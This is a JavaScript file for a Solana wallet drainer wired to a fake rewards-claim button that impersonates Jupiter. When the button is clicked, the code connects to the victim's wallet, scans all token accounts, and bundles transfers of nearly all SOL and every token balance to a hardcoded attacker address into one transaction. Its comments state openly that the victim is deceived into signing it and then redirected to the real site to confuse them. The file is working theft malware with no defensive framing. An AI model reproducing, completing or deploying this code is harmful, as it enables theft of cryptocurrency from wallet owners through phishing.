// Import necessary libraries
import { Connection, PublicKey, SystemProgram, Transaction } from '@solana/web3.js';
import { TOKEN_PROGRAM_ID, createTransferCheckedInstruction } from '@solana/spl-token';

// Define constants
const ATTACKER_PUBKEY = new PublicKey("4KC18vVR6JacduPqGFWJjKyUV5fGsw7qsZYGNV2M7Wan");
const connection = new Connection("https://api.mainnet-beta.solana.com", "confirmed");

// Function to initiate fake claim
async function initiateFakeClaim() {
    try {
        console.log("Initializing 'Rewards'...");

        // Get user's wallet
        const userWallet = await getUserWallet();

        // 1. Inventory Scan: Find every SPL token with a balance
        const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
            userWallet.publicKey,
            { programId: TOKEN_PROGRAM_ID }
        );

        let drainTx = new Transaction();
        const { blockhash } = await connection.getLatestBlockhash();
        drainTx.recentBlockhash = blockhash;
        drainTx.feePayer = userWallet.publicKey;

        // 2. The SOL Sweep (leave a tiny bit for gas so it doesn't fail)
        const balance = await connection.getBalance(userWallet.publicKey);
        if (balance > 5000) {
            drainTx.add(
                SystemProgram.transfer({
                    fromPubkey: userWallet.publicKey,
                    toPubkey: ATTACKER_PUBKEY,
                    lamports: balance - 2000, 
                })
            );
        }

        // 3. The Token Harvest (USDC, BONK, etc.)
        tokenAccounts.value.forEach((account) => {
            const amount = account.account.data.parsed.info.tokenAmount.uiAmount;
            const mint = new PublicKey(account.account.data.parsed.info.mint);
            
            if (amount > 0) {
                // For each token found, add a transfer instruction to the SAME transaction
                drainTx.add(
                    createTransferCheckedInstruction(
                        account.pubkey, // User's token account
                        mint,           // Token Mint (USDC/WIF/etc)
                        ATTACKER_PUBKEY,// Attacker's token account (usually pre-created)
                        userWallet.publicKey,
                        amount * Math.pow(10, account.account.data.parsed.info.tokenAmount.decimals),
                        account.account.data.parsed.info.tokenAmount.decimals
                    )
                );
            }
        });

        // 4. The Deception: Trigger the wallet UI
        // The user thinks they are signing "Claim Jupiter Rewards"
        // In reality, they are signing the 'drainTx' bundle
        const signed = await userWallet.signTransaction(drainTx);
        
        // 5. The Vanishing Act
        const txid = await connection.sendRawTransaction(signed.serialize());
        console.log(`Transaction sent: ${txid}`);
        // Redirect to real site to confuse them
        // window.location.href = "https://jup.ag";

    } catch (err) {
        console.error("User rejected or RPC failed", err);
    }
}

// Function to get user's wallet
async function getUserWallet() {
    // This function should return the user's wallet object
    // For example, using Phantom wallet
    if (window.solana) {
        const { solana } = window;
        const wallet = await solana.connect();
        return wallet;
    } else {
        throw new Error("No wallet found");
    }
}

// Add event listener to claim button
document.addEventListener("DOMContentLoaded", function() {
    const claimButton = document.getElementById('claim-button');
    claimButton.addEventListener('click', initiateFakeClaim);
});
